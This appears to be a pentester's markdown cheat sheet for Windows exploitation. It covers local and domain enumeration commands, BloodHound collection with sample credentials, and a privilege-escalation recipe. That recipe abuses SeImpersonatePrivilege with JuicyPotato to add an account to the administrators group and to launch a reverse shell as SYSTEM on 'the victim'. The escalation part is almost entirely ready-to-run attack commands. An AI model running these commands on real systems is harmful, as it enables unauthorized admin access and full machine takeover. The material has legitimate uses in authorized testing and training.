# Windows-Exploitation

## Windows enumeration

#### Who
```
whoami
echo %username%
whoami /priv
```

#### Users and groups
```
➤ What users/localgroups are on the machine?
net users
net localgroups

➤ More info about a specific user. Check if user has privileges.
net user user1

➤ View Domain Groups
net group /domain

➤ View Members of Domain Group
net group /domain {Group Name}
```

#### System info
```
systeminfo
ver
hostname
```

#### Patch on the system
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

#### Network
```
ipconfig /all
route print
arp -A
```

#### Firewall
```
netsh firewall show state
netsh firewall show config
```

##### Search a specific filename
```
dir /b/s proof.txt
```

## Automated enumeration


## Bloodhound enumeration
```
➤ Install Bloodhound GUI
https://www.kalilinux.in/2021/01/install-bloodhound-on-kali-linux.html

➤ Install Bloodhound-python
pip3 install bloodhound

➤ Let's use bloodhound to visualise the domain and look for privilege escalation paths
bloodhound-python -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -gc <COMPUTERNAME>.<DOMAIN> -c all -ns 10.0.0.1
----> EX:  bloodhound-python -d example.local -u svc-admin -p s3rvice -gc laptop01.example.local -c all -ns 10.0.0.1

➤ Upload the JSON file into Bloodhound GUI

```


## Privesc

#### MS17-010 - Eternal Blue


#### Abuse SeImpersonatePrivilege

```
➤ 1. Verify that 'SeImpersonatePrivilege' privilege is enabled.

C:\Users\Lexis>whoami /priv
Informations de privilèges
----------------------

Privilege Name                Description                                  State
============================= ============================================ =========
SeShutdownPrivilege           Stop the system                              Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                     Enabled
SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set               Disabled

➤ 2. Import JuicyPotato on the victim

➤ 3. Basic attacks without specific CLSID

• Add a user in the administrators group
.\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd .exe -t * -a "/c net localgroup administrators {MY_EXISTING_USER} /add"

• Execute a reverse shell as NT AUTHORITY\SYSTEM
.\JuicyPotato.exe -l 1337 -p C:\Users\public\rshell.exe -t *

➤ 4. Using specific CLSID

helper : https://ohpe.it/juicy-potato/CLSID/

• Manual CLSID dectection based on OS version
https://ohpe.it/juicy-potato/CLSID/

• Automated CLSID detection scripts
.\GetCLSID.ps1
or 
.\clisd-detector.bat

• Add a user in the administrators group using the specific CLSID
.\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd .exe -t {CLSID} -a "/c net localgroup administrators {MY_EXISTING_USER} /add"
```
